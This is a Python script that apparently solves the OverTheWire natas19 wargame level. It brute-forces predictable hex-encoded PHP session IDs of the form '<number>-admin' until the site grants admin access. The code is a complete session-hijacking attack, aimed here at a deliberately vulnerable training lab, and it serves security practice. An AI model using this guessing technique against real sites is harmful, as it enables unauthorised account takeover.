#!/usr/bin/env python

import binascii
import requests

URL = 'http://natas19.natas.labs.overthewire.org/index.php'
USERNAME = 'natas19'
PASSWORD = 'xxxxxxxxxxxxxxxxxxxxxxxx'

ADDON = "?debug=true&username=admin&password=admin"
for i in range(640, -1, -1):

    session = binascii.hexlify(str.encode(str(i)+'-admin')).decode('utf-8')

    cookies = {"PHPSESSID": session}
    if i % 10 == 0:
        print("Trying %s" % cookies)

    r = requests.get(URL+ADDON, cookies=cookies, auth=(USERNAME, PASSWORD))
    if "You are an admin" in r.text:
        print("Found %s" % cookies)
        print(r.text)
        break
